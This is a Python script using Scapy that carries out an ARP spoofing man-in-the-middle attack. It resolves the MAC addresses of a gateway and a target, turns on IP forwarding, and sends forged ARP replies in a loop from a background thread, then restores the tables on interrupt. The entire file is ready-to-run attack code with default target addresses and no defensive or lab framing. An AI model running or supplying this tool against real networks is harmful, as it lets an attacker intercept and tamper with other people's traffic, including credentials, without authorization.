from scapy.all import *
from scapy.all import srp, Ether, ARP, conf
import os, signal, sys, time, threading
from argparse import ArgumentParser

#Get ARP spoofing parameters
def get_option():
    argparser = ArgumentParser(usage = 'sudo python arp_spoof.py -g [gateway ip address] -t [target ip address]')
    argparser.add_argument('-g', type=str, default='192.168.2.1', help='Specify a gateway ip address.')
    argparser.add_argument('-t', type=str, default='192.168.2.119', help='Specify a target ip address.')
    return argparser.parse_args()

#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2:
    resp, unans =  srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=ip_address))
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Restore the network by reversing the ARP spoofing attack. Broadcast ARP Reply with correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst='ff:ff:ff:ff:ff:ff', pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst='ff:ff:ff:ff:ff:ff', pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print('Disabling IP forwarding')
    #Disable IP Forwarding on a mac
    os.system('sysctl -w net.inet.ip.forwarding=0')
    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_spoof(gateway_ip, gateway_mac, target_ip, target_mac):
    print('Started ARP spoofing attack [CTRL-C to stop]')
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print('Stopped ARP spoofing attack. Restoring network')
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

def spoof_thread():
    args = get_option()
    gateway_ip = str(args.g)
    target_ip = str(args.t)
    # Disable progress display.
    conf.verb = 0

    #Start the script
    print('Starting script: arp_spoof.py')
    print('Enabling IP forwarding')
    #Enable IP Forwarding on a mac
    os.system('sysctl -w net.inet.ip.forwarding=1')
    print('Gateway IP address: ' + gateway_ip)
    print('Target IP address: ' + target_ip)

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print('[!] Unable to get gateway MAC address. Exiting..')
        sys.exit(0)
    else:
        print('Gateway MAC address: ' + gateway_mac)

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print('[!] Unable to get target MAC address. Exiting..')
        sys.exit(0)
    else:
        print('Target MAC address: ' + target_mac)

    #ARP spoofing thread
    try:
        spoof_thread = threading.Thread(target=arp_spoof, args=(gateway_ip, gateway_mac, target_ip, target_mac))
        spoof_thread.daemon = True
        spoof_thread.start()
        print('Start arp spoofing')
        while True: time.sleep(10)

    except KeyboardInterrupt:
        print('\nStopping network capture..Restoring network')
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

if __name__ == '__main__':
    spoof_thread()
